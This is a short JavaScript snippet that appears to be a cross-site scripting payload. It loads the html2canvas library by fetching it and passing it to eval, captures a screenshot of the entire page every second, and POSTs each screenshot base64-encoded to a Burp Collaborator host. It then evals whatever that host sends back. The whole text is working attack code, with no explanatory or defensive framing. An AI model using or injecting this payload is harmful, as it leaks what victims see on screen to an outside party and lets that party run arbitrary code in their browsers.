fetch('https://html2canvas.hertzen.com/dist/html2canvas.min.js')
    .then(response => response.text())
    .then(text => eval(text))
    .then(() => {console.log('Sleeping to allow resources loading!');setTimeout(function () {setInterval(function () {html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => {function b() {eval(this.responseText)};a = new XMLHttpRequest();a.addEventListener("load", b);a.open("POST", "//ep7ux11l8647037a9jv2lreo2f87ww.burpcollaborator.net/screenshot");a.send(btoa(canvas.toDataURL()));}).catch(e => console.log(e));}, 1000);}, 3000);})
